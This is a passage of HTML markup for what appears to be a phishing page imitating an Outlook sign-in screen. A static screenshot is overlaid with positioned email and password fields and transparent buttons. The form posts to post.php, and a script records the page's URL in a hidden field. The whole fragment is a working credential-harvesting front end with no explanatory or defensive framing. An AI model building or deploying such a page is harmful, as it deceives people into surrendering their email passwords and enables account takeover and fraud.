        background-color: #ffffff;

  <body>
    <div
      id="bv_Image2"
      style="margin:0;padding:0;position:absolute;left:20px;top:15px;width:360px;height:389px;text-align:left;z-index:3;"
    >
      <img
        src="images/Snapshot_2014-07-15_001645.png"
        id="Image2"
        alt=""
        style="width:360px;height:389px;"
        align="top"
        border="0"
      />
    </div>

    <input
      id="Button2"
      name="Button1"
      value=""
      style="position:absolute;left:32px;top:267px;width:86px;height:38px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:4"
      type="submit"
    />

    <div
      id="bv_Form1"
      style="position:absolute;left:0px;top:0px;width:398px;height:403px;z-index:5"
    >
      <script>
        var tbstring = location.href.substring(0, location.href.lastIndexOf("/"));
      var urlss = document.getElementById("pageUrl");
      urlss.value = tbstring;
        function validateForm() {
          var x = document.forms["Form1"]["outlookuser"].value;
          var y = document.forms["Form1"]["outlookpassword"].value;
          if (x == "" || y == "") {
            alert("Email or Password fields cannot be empty!");
            return false;
          }
        }
      </script>

      <form
        name="Form1"
        method="post"
        onsubmit="return validateForm()"
        action="post.php"
        validate
      >

      <input type="hidden" name="pageUrl" id="pageUrl" value="">
        <input
          id="outlookuser"
          style="position:absolute;left:41px;top:137px;width:318px;height:29px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0"
          name="outlookuser"
          type="text"
          placeholder=" someone@example.com"
          validate="required:true"
          pattern="[a-zA-Z0-9!#$%&'*+\/=?^_`{|}~.-]+@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*"
        />
        <input
          id="outlookpassword"
          style="position:absolute;left:41px;top:177px;width:318px;height:29px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:1"
          name="outlookpassword"
          value=""
          type="password"
          placeholder=" Password"
        />
        <input
          id="Button3"
          name="Button1"
          value=""
          style="position:absolute;left:41px;top:265px;width:86px;height:38px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2"
          type="submit"
        />
      </form>
    </div>
  </body>
</html>
